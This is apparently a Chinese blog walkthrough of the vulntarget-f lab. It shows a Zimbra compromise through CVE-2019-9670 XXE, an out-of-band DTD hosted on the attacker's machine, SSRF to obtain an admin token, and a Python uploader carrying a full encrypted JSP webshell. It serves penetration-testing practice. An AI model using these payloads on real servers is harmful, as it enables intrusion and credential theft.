@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>vulntarget-f | MssnHarvey</title><meta name="author" content="Harvey"><meta name="copyright" content="Harvey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="机器密码： 外网centos：root&#x2F;vulntarget-f 内网Ubuntu、二层内网Ubuntu：root&#x2F;Vulntarget# 拓扑图：   准备工作由于外网centos这台机器找不着密码，试了好多个也都不对，于是这里我们重置一下centos的密码 1234567重启开机，在第一行按e，进行编辑：①.ro改为rw②.在LANG&#x3D;en_US.UFT-8后面添加ini">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulntarget-f">
+<meta property="og:url" content="http://example.com/2022/12/13/vulntarget-f/index.html">
+<meta property="og:site_name" content="MssnHarvey">
+<meta property="og:description" content="机器密码： 外网centos：root&#x2F;vulntarget-f 内网Ubuntu、二层内网Ubuntu：root&#x2F;Vulntarget# 拓扑图：   准备工作由于外网centos这台机器找不着密码，试了好多个也都不对，于是这里我们重置一下centos的密码 1234567重启开机，在第一行按e，进行编辑：①.ro改为rw②.在LANG&#x3D;en_US.UFT-8后面添加ini">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/vulntarget-f.jpg">
+<meta property="article:published_time" content="2022-12-13T13:16:44.000Z">
+<meta property="article:modified_time" content="2026-02-09T12:51:53.243Z">
+<meta property="article:author" content="Harvey">
+<meta property="article:tag" content="vulntarget">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/vulntarget-f.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "vulntarget-f",
+  "url": "http://example.com/2022/12/13/vulntarget-f/",
+  "image": "http://example.com/imgs/vulntarget-f.jpg",
+  "datePublished": "2022-12-13T13:16:44.000Z",
+  "dateModified": "2026-02-09T12:51:53.243Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Harvey",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/l1.jpg"><link rel="canonical" href="http://example.com/2022/12/13/vulntarget-f/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulntarget-f',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/../imgs/vulntarget-f.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">MssnHarvey</span></a><a class="nav-page-title" href="/"><span class="site-name">vulntarget-f</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">vulntarget-f</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-13T13:16:44.000Z" title="发表于 2022-12-13 21:16:44">2022-12-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-09T12:51:53.243Z" title="更新于 2026-02-09 20:51:53">2026-02-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/">靶场通关</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p><strong>机器密码：</strong></p>
+<p>外网centos：root&#x2F;vulntarget-f</p>
+<p>内网Ubuntu、二层内网Ubuntu：root&#x2F;Vulntarget#</p>
+<p><strong>拓扑图：</strong></p>
+<p><img src="/../imgs/vulntarget-f1.PNG"></p>
+</blockquote>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>由于外网centos这台机器找不着密码，试了好多个也都不对，于是这里我们重置一下centos的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">重启开机，在第一行按e，进行编辑：</span><br><span class="line">①.ro改为rw</span><br><span class="line">②.在LANG=en_US.UFT-8后面添加init=/bin/sh</span><br><span class="line">按Ctrl+X重启</span><br><span class="line">进入命令行输入passwd修改密码</span><br><span class="line">vi /etc/sysconfig/selinux    # 关闭selinux，它这里就是disable的，所以不需要改动</span><br><span class="line">exec /sbin/init        # 重启系统，完成重置密码</span><br></pre></td></tr></table></figure>
+
+<p>后面打的时候发现重置完&#x2F;tmp目录下的都会被清空，会导致无法获取flag，就直接恢复快照后神奇的发现又能扫到目标主机了；然后就是centos这台环境说是有点问题的要根据文档搭一遍，不过我这边恢复快照环境正常没出现问题，有问题可以根据下面文档自行搭建</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/t_vxF2EivycI_1WEjunEIg">https://mp.weixin.qq.com/s/t_vxF2EivycI_1WEjunEIg</a></p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描存活主机和端口，发现开放了22、443等端口，存在Zimbra</p>
+<p>访问web如下：</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以利用msf中自带的进行攻击</p>
+<p><img src="/../imgs/vulntarget-f2.PNG"></p>
+<p>msf上线后反弹shell，并生成交互式的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f3.PNG"></p>
+<p>在root目录下发现flag，但是权限不够无法cat flag，所以需要提权，先信息收集一下</p>
+<p><img src="/../imgs/vulntarget-f4.png"></p>
+<p>Linux内核提权都试了下并没成功，后面看了下是在<code>/tmp/login_data/root</code>下找到root密码：vulntarget-f</p>
+<p><img src="/../imgs/vulntarget-f5.png"></p>
+<p>得到flag：vulntarget-f{——dsjlkfj489rjgr—-}</p>
+<p><img src="/../imgs/vulntarget-f6.png"></p>
+<p>前面就是为了测试一下外网centos是否正常直接利用msf现成的，为了减少对msf的依赖，后面再来手工打一下看看，可以通过xxe与ssrf完成上传webshell</p>
+<blockquote>
+<p>Zimbra的配置文件在<code>/conf/localconfig.xml</code>，里面有保存到一些配置信息的用户名和密码</p>
+</blockquote>
+<p>首先尝试下CVE-2019-9670 XXE漏洞，可以成功读到&#x2F;etc&#x2F;passwd</p>
+<p>poc如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /Autodiscover/Autodiscover.xml/ HTTP/1.1</span><br><span class="line">Host: 192.168.150.141:7071</span><br><span class="line">Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=true</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 346</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line"> &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span><br><span class="line">    &lt;Request&gt;</span><br><span class="line">      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span><br><span class="line">      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;</span><br><span class="line">    &lt;/Request&gt;</span><br><span class="line">  &lt;/Autodiscover&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f7.png"></p>
+<p>然后我们开始构造payload来读取Zimbra的配置文件，其中xml文件需要加上CDATA标签才能作为文本读取，并且xxe不能内部实体进行拼接，所以我们通过kali起个web服务来构造外部dtd，再用前面的那个包请求xml得到密码：XbVaoX3Y</p>
+<p>poc.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /Autodiscover/Autodiscover.xml/ HTTP/1.1</span><br><span class="line">Host: 192.168.150.141:7071</span><br><span class="line">Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=true</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 404</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE Autodiscover [</span><br><span class="line">        &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.150.128/poc.dtd&quot;&gt;</span><br><span class="line">        %dtd;</span><br><span class="line">        %all;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span><br><span class="line">    &lt;Request&gt;</span><br><span class="line">        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span><br><span class="line">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span><br><span class="line">    &lt;/Request&gt;</span><br><span class="line">&lt;/Autodiscover&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f8.png"></p>
+<p>接着利用已经得到的密码获取低权限的token，低权限的token可以通过soap接口发送AuthRequest进行获取，url改为<code>/service/soap</code>或<code>/service/admin/soap</code>，可以返回一个低权限的token</p>
+<p>poc如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /service/admin/soap HTTP/1.1</span><br><span class="line">Host: 192.168.150.141:7071</span><br><span class="line">Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=true</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 463</span><br><span class="line"> </span><br><span class="line">&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span><br><span class="line">   &lt;soap:Header&gt;</span><br><span class="line">       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span><br><span class="line">           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span><br><span class="line">       &lt;/context&gt;</span><br><span class="line">   &lt;/soap:Header&gt;</span><br><span class="line">   &lt;soap:Body&gt;</span><br><span class="line">     &lt;AuthRequest xmlns=&quot;urn:zimbraAccount&quot;&gt;</span><br><span class="line">        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;</span><br><span class="line">        &lt;password&gt;XbVaoX3Y&lt;/password&gt;</span><br><span class="line">     &lt;/AuthRequest&gt;</span><br><span class="line">   &lt;/soap:Body&gt;</span><br><span class="line">&lt;/soap:Envelope&gt;</span><br><span class="line"> </span><br><span class="line"># ZM_AUTH_TOKEN=0_2d4b50e77e5ae4298afd620f5d90d68e61dc8bcf_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303637343037373736323b747970653d363a7a696d6272613b7469643d31303a313836303539373536383b;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f9.png"></p>
+<p>再通过ssrf漏洞获取proxy接口，访问soap接口来获取到高权限的token</p>
+<p>访问<code>/service/proxy?target=``https://127.0.0.1:8443/service/admin/soap</code>，对其进行抓包，修改为POST，cookie改为得到的低权限token（等级替换为ZM_ADMIN_AUTH_TOKEN），xmlns改为urn:zimbraAdmin</p>
+<p>poc如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /service/admin/soap/ HTTP/1.1</span><br><span class="line">Host: 192.168.150.141:7071</span><br><span class="line">Cookie: ZM_ADMIN_AUTH_TOKEN=0_2d4b50e77e5ae4298afd620f5d90d68e61dc8bcf_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303637343037373736323b747970653d363a7a696d6272613b7469643d31303a313836303539373536383b;</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 461</span><br><span class="line"> </span><br><span class="line">&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span><br><span class="line">   &lt;soap:Header&gt;</span><br><span class="line">       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span><br><span class="line">           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span><br><span class="line">       &lt;/context&gt;</span><br><span class="line">   &lt;/soap:Header&gt;</span><br><span class="line">   &lt;soap:Body&gt;</span><br><span class="line">     &lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;</span><br><span class="line">        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;</span><br><span class="line">        &lt;password&gt;XbVaoX3Y&lt;/password&gt;</span><br><span class="line">     &lt;/AuthRequest&gt;</span><br><span class="line">   &lt;/soap:Body&gt;</span><br><span class="line">&lt;/soap:Envelope&gt;</span><br><span class="line"> </span><br><span class="line"># ZM_ADMIN_AUTH_TOKEN=0_e78154820c9cf010bff124807fd2a5d976753ba1_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303534353633313531323b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3239333533313533393b;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f10.png"></p>
+<p>最后利用高权限的token上传文件从而getshell，这里我们使用python脚本上传webshell，shell路径为<code>/downloads/shell.jsp</code>（访问shell的时候得加上ADMIN_AUTH_TOKEN</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">file= &#123;</span><br><span class="line"><span class="string">&#x27;filename1&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;whocare&quot;</span>,<span class="literal">None</span>),</span><br><span class="line"><span class="string">&#x27;clientFile&#x27;</span>:(<span class="string">&quot;shell.jsp&quot;</span>,<span class="string">r&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;</span>,<span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line"><span class="string">&#x27;requestId&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;12&quot;</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;   <span class="comment">#这里我上传的是一个冰蝎的马</span></span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=0_e78154820c9cf010bff124807fd2a5d976753ba1_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303534353633313531323b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3239333533313533393b&quot;</span>,    <span class="comment">#修改成上面获取到的的admin_token</span></span><br><span class="line"><span class="string">&quot;Host&quot;</span>:<span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(<span class="string">&quot;https://192.168.150.141:7071/service/extension/clientUploader/upload&quot;</span>,files=file,headers=headers,verify=<span class="literal">False</span>)   <span class="comment">#ip也需要修改</span></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>上传成功后通过冰蝎连接，添加cookie请求头，shell路径如下</p>
